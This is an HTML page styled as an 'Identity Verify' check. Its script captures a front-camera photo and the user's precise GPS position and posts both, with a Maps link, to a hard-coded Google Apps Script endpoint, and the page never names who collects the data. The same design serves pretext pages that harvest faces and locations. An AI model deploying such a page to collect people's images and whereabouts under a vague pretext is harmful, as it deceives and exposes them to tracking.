<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Face & Location Verify</title>
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600&family=Syne:wght@700;800&display=swap" rel="stylesheet"/>
  <style>
    :root {
      --purple: #6739B7;
      --purple-light: #C3A0EC;
      --purple-pale: #F0E6FF;
      --purple-mid: #9B6FD4;
      --bg: #faf8ff;
      --text: #1a1128;
      --text-muted: #7a6b99;
      --card: #ffffff;
      --radius: 24px;
      --shadow: 0 8px 40px rgba(103,57,183,0.13);
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: 'DM Sans', sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 24px;
      position: relative;
      overflow-x: hidden;
    }

    /* Background blobs */
    body::before, body::after {
      content: '';
      position: fixed;
      border-radius: 50%;
      filter: blur(80px);
      opacity: 0.25;
      pointer-events: none;
      z-index: 0;
    }
    body::before {
      width: 500px; height: 500px;
      background: var(--purple);
      top: -150px; left: -150px;
    }
    body::after {
      width: 400px; height: 400px;
      background: var(--purple-light);
      bottom: -100px; right: -100px;
    }

    .container {
      position: relative;
      z-index: 1;
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 28px;
    }

    header {
      text-align: center;
    }
    header h1 {
      font-family: 'Syne', sans-serif;
      font-size: 2rem;
      font-weight: 800;
      background: linear-gradient(135deg, var(--purple), var(--purple-light));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      line-height: 1.1;
    }
    header p {
      margin-top: 8px;
      color: var(--text-muted);
      font-size: 0.9rem;
      font-weight: 400;
    }

    .camera-card {
      width: 100%;
      background: var(--card);
      border-radius: var(--radius);
      box-shadow: var(--shadow);
      overflow: hidden;
      border: 1.5px solid rgba(195,160,236,0.3);
      position: relative;
    }

    .camera-frame {
      position: relative;
      width: 100%;
      aspect-ratio: 4/3;
      background: #1a1128;
      overflow: hidden;
    }

    #video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      transform: scaleX(-1); /* mirror */
      display: block;
    }

    /* Corner brackets overlay */
    .corner {
      position: absolute;
      width: 28px; height: 28px;
      border-color: var(--purple-light);
      border-style: solid;
      opacity: 0.85;
    }
    .corner.tl { top: 16px; left: 16px; border-width: 3px 0 0 3px; border-radius: 4px 0 0 0; }
    .corner.tr { top: 16px; right: 16px; border-width: 3px 3px 0 0; border-radius: 0 4px 0 0; }
    .corner.bl { bottom: 16px; left: 16px; border-width: 0 0 3px 3px; border-radius: 0 0 0 4px; }
    .corner.br { bottom: 16px; right: 16px; border-width: 0 3px 3px 0; border-radius: 0 0 4px 0; }

    /* Scan line animation */
    .scan-line {
      position: absolute;
      left: 0; right: 0;
      height: 2px;
      background: linear-gradient(90deg, transparent, var(--purple-light), transparent);
      animation: scan 2.5s ease-in-out infinite;
      opacity: 0.7;
    }
    @keyframes scan {
      0% { top: 10%; }
      50% { top: 90%; }
      100% { top: 10%; }
    }

    .camera-placeholder {
      width: 100%;
      height: 100%;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 12px;
      color: var(--purple-light);
    }
    .camera-placeholder svg { opacity: 0.6; }
    .camera-placeholder span { font-size: 0.85rem; opacity: 0.6; }

    .card-body {
      padding: 20px 24px 24px;
    }

    .status-row {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
    }

    .status-pill {
      flex: 1;
      display: flex;
      align-items: center;
      gap: 7px;
      padding: 9px 13px;
      border-radius: 50px;
      background: var(--purple-pale);
      font-size: 0.78rem;
      font-weight: 500;
      color: var(--text-muted);
      transition: all 0.3s;
    }
    .status-pill .dot {
      width: 8px; height: 8px;
      border-radius: 50%;
      background: #ccc;
      flex-shrink: 0;
      transition: background 0.3s;
    }
    .status-pill.active { background: rgba(103,57,183,0.1); color: var(--purple); }
    .status-pill.active .dot { background: #7CFC00; box-shadow: 0 0 6px #7CFC00; }
    .status-pill.error { color: #e53e3e; }
    .status-pill.error .dot { background: #e53e3e; }

    #verifyBtn {
      width: 100%;
      padding: 16px;
      border: none;
      border-radius: 50px;
      background: linear-gradient(135deg, var(--purple), var(--purple-mid));
      color: white;
      font-family: 'Syne', sans-serif;
      font-size: 1rem;
      font-weight: 700;
      letter-spacing: 0.5px;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(103,57,183,0.35);
      transition: all 0.2s;
      position: relative;
      overflow: hidden;
    }
    #verifyBtn:hover:not(:disabled) {
      transform: translateY(-2px);
      box-shadow: 0 8px 28px rgba(103,57,183,0.45);
    }
    #verifyBtn:active:not(:disabled) { transform: translateY(0); }
    #verifyBtn:disabled {
      opacity: 0.65;
      cursor: not-allowed;
    }

    /* Ripple */
    #verifyBtn::after {
      content: '';
      position: absolute;
      inset: 0;
      background: radial-gradient(circle at center, rgba(255,255,255,0.25) 0%, transparent 70%);
      opacity: 0;
      transition: opacity 0.3s;
    }
    #verifyBtn:active::after { opacity: 1; }

    .result-box {
      display: none;
      margin-top: 16px;
      padding: 14px 16px;
      border-radius: 16px;
      font-size: 0.85rem;
      line-height: 1.5;
      font-weight: 500;
    }
    .result-box.success {
      background: rgba(103,57,183,0.08);
      border: 1px solid rgba(103,57,183,0.2);
      color: var(--purple);
    }
    .result-box.error {
      background: rgba(229,62,62,0.07);
      border: 1px solid rgba(229,62,62,0.2);
      color: #c53030;
    }

    canvas { display: none; }

    footer {
      font-size: 0.75rem;
      color: var(--text-muted);
      opacity: 0.6;
      text-align: center;
    }
  </style>
</head>
<body>

<div class="container">
  <header>
    <h1>Identity Verify</h1>
    <p>Allow camera & location, then tap verify</p>
  </header>

  <div class="camera-card">
    <div class="camera-frame" id="cameraFrame">
      <video id="video" autoplay playsinline muted></video>
      <div class="corner tl"></div>
      <div class="corner tr"></div>
      <div class="corner bl"></div>
      <div class="corner br"></div>
      <div class="scan-line" id="scanLine" style="display:none"></div>
      <div class="camera-placeholder" id="placeholder">
        <svg width="48" height="48" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
          <path stroke-linecap="round" stroke-linejoin="round" d="M6.827 6.175A2.31 2.31 0 015.186 7.23c-.38.054-.757.112-1.134.175C2.999 7.58 2.25 8.507 2.25 9.574V18a2.25 2.25 0 002.25 2.25h15A2.25 2.25 0 0021.75 18V9.574c0-1.067-.75-1.994-1.802-2.169a47.865 47.865 0 00-1.134-.175 2.31 2.31 0 01-1.64-1.055l-.822-1.316a2.192 2.192 0 00-1.736-1.039 48.774 48.774 0 00-5.232 0 2.192 2.192 0 00-1.736 1.039l-.821 1.316z"/>
          <path stroke-linecap="round" stroke-linejoin="round" d="M16.5 12.75a4.5 4.5 0 11-9 0 4.5 4.5 0 019 0zM18.75 10.5h.008v.008h-.008V10.5z"/>
        </svg>
        <span>Starting camera...</span>
      </div>
    </div>

    <div class="card-body">
      <div class="status-row">
        <div class="status-pill" id="camStatus">
          <div class="dot"></div> Camera
        </div>
        <div class="status-pill" id="locStatus">
          <div class="dot"></div> Location
        </div>
      </div>

      <button id="verifyBtn" disabled>Capture & Verify</button>

      <div class="result-box" id="resultBox"></div>
    </div>
  </div>

  <footer>Your data is submitted securely ‚Ä¢ One-time capture</footer>
</div>

<canvas id="canvas"></canvas>

<script>
  // ============================================================
  // CONFIGURATION ‚Äî PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL:
  // ============================================================
  const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyJwQOtoFQuCydM6e8NzWwbwvrzXdaGzAA3wSiTlpLj4Pf8Nb3C7DY3A3CVGYB2huapcg/exec';
  // ============================================================

  const video       = document.getElementById('video');
  const canvas      = document.getElementById('canvas');
  const verifyBtn   = document.getElementById('verifyBtn');
  const resultBox   = document.getElementById('resultBox');
  const camStatus   = document.getElementById('camStatus');
  const locStatus   = document.getElementById('locStatus');
  const placeholder = document.getElementById('placeholder');
  const scanLine    = document.getElementById('scanLine');

  let cameraReady = false;
  let locationReady = false;
  let coords = null;

  function checkReady() {
    if (cameraReady && locationReady) {
      verifyBtn.disabled = false;
    }
  }

  // --- CAMERA ---
  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      video.srcObject = stream;
      video.onloadedmetadata = () => {
        placeholder.style.display = 'none';
        scanLine.style.display = 'block';
        cameraReady = true;
        camStatus.classList.add('active');
        checkReady();
      };
    } catch (e) {
      placeholder.querySelector('span').textContent = 'Camera access denied';
      camStatus.classList.add('error');
      camStatus.querySelector('.dot').style.background = '#e53e3e';
    }
  }

  // --- LOCATION ---
  function getLocation() {
    if (!navigator.geolocation) {
      locStatus.classList.add('error');
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => {
        coords = { lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy };
        locationReady = true;
        locStatus.classList.add('active');
        checkReady();
      },
      err => {
        locStatus.classList.add('error');
        locStatus.querySelector('.dot').style.background = '#e53e3e';
        // Still allow button if camera is ready (location optional fallback)
        locationReady = true;
        checkReady();
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  }

  // --- CAPTURE & SUBMIT ---
  async function captureAndSubmit() {
    verifyBtn.disabled = true;
    verifyBtn.textContent = 'Processing‚Ä¶';
    resultBox.style.display = 'none';

    // Capture frame
    canvas.width  = video.videoWidth  || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0);

    const imageBase64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];

    const timestamp = new Date().toISOString();
    const lat  = coords ? coords.lat  : 'unavailable';
    const lng  = coords ? coords.lng  : 'unavailable';
    const acc  = coords ? coords.accuracy + 'm' : 'unavailable';
    const mapsLink = coords ? `https://www.google.com/maps?q=${lat},${lng}` : 'N/A';

    const payload = { timestamp, lat, lng, accuracy: acc, mapsLink, image: imageBase64 };

    try {
      const res = await fetch(APPS_SCRIPT_URL, {
        method: 'POST',
        body: JSON.stringify(payload)
      });
      const data = await res.json();
      if (data.result === 'success') {
        showResult('success', `‚úì Verified & saved at ${new Date().toLocaleTimeString()}<br>üìç ${lat}, ${lng}`);
        verifyBtn.textContent = 'Verified ‚úì';
      } else {
        throw new Error(data.error || 'Unknown error');
      }
    } catch (e) {
      showResult('error', `‚úó Submission failed: ${e.message}<br>Check your Apps Script URL.`);
      verifyBtn.disabled = false;
      verifyBtn.textContent = 'Capture & Verify';
    }
  }

  function showResult(type, html) {
    resultBox.className = 'result-box ' + type;
    resultBox.innerHTML = html;
    resultBox.style.display = 'block';
  }

  verifyBtn.addEventListener('click', captureAndSubmit);

  startCamera();
  getLocation();
</script>
</body>
</html>
